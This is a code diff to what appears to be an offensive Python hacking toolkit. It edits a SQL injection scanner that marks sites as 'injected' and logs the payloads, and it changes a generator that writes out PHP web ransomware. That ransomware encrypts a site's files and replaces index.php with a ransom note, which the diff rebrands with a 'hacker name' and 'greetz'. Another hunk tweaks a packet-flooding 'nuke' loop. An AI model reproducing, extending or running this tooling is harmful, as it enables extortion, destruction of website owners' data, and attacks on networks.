@@ -316,7 +316,7 @@ def sqlite():
                     else:
                         print(f"{yellow}[{red}~{yellow}] {red} Invalid Options {white}")
                         exit()
-                    if (reques.text == "information_schema" in reques.text):
+                    if "information_schema" in reques.text:
                         print(f"{yellow}[ {green}Injected {yellow}] {gold}Site : {url} is injected! {white}")
                         print(f"{yellow}[ {green}Injected {yellow}] {gold}Payload : {ul} {white}")
                         save_log2(target, ul)
@@ -688,7 +688,7 @@ def sqlite():
     else:
         print(red + 'Invalid options!')
         return sqlite()
-def ransomware1(sa, email):
+def ransomware1(sa, email, name, greetz):
     ransomware1 = "<?php\n"
     ransomware1 += "$encryptionKey = 'yoursitehasbeenencrypted'; // Change this to your desired encryption key\n"
     ransomware1 += "// Function to encrypt a file\n"
@@ -724,7 +724,14 @@ def ransomware1(sa, email):
     ransomware1 += "}\n\n"
     ransomware1 += "// Call the ransomware function\n"
     ransomware1 += "ransomware($encryptionKey);\n"
-    ransomware1 += "$notes = '<style>\n"
+    ransomware1 += "$notes = '\n"
+    ransomware1 += "<!DOCTYPE html>\n"
+    ransomware1 += "<html>\n"
+    ransomware1 += "<head>\n"
+    ransomware1 += f"    <title>Locked by {name}</title>\n"
+    ransomware1 += '<table width="100%" height="100%">\n'
+    ransomware1 += '<tbody><tr><td align="center">\n'
+    ransomware1 += "<style>\n"
     ransomware1 += "    @keyframes colorChange {\n"
     ransomware1 += "        0% {\n"
     ransomware1 += "            background-color: blue;\n"
@@ -748,6 +755,7 @@ def ransomware1(sa, email):
     ransomware1 += "        font-family: Arial, sans-serif;\n"
     ransomware1 += "        font-size: 20px;\n"
     ransomware1 += "        text-align: center;\n"
+    ransomware1 += "        overflow: hidden;\n"
     ransomware1 += "    }\n\n"
     ransomware1 += "    h1 {\n"
     ransomware1 += "        color: white;\n"
@@ -770,11 +778,10 @@ def ransomware1(sa, email):
     ransomware1 += "    }\n"
     ransomware1 += "</style>\n\n"
     ransomware1 += '<div class="container">\n'
-    ransomware1 += "    <h1>Oops, your files have been encrypted!</h1>\n"
-    ransomware1 += "    <p>To decrypt your files, you must pay a ransom.</p>\n"
-    ransomware1 += f"    <p>Contact us at {email} for payment details.</p>\n"
-    ransomware1 += "    <p>Failure to comply will result in permanent deletion of your files.</p>\n"
-    ransomware1 += "</div>';\n"
+    ransomware1 += f"    <h1>Locked by {name}</h1>\n"
+    ransomware1 += f"    <p>Contact me at {email}.<br>Failure to comply will result in permanent deletion of your files.</p>\n"
+    ransomware1 += f"    <p>Greetz:<br><br>{greetz}</p>\n"
+    ransomware1 += "</div></html>';\n"
     ransomware1 += "file_put_contents('index.php', $notes);\n"
     ransomware1 += "?>"
     target_directory = 'Ransomware'
@@ -5436,7 +5443,9 @@ elif answer == ("20"):
                 pass
                 email = input("your email : ")
                 sa = input("Save AS [ex : ransomware1, ransomware2] : ")
-                ransomware1(sa, email)
+                name = input("your hacker name / ransomware name [example name : MrSanZz, example ransomware name : KonXcrypter] : ")
+                greetz = input("greetz : ")
+                ransomware1(sa, email, name, greetz)
             if choice == '2':
                 pass
                 name = input("Enter your cyber name : ")
@@ -5492,7 +5501,7 @@ elif answer == ("20"):
 
                 for i in range(nuke):
                     # Generate a random WPA header
-                    wpa_header = ''.join(random.choices("0123456789ABCDEF", k=64))
+                    wpa_header = ''.join(random.choices("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ", k=64))
 
                     # Set the packet payload
                     payload = wpa_header
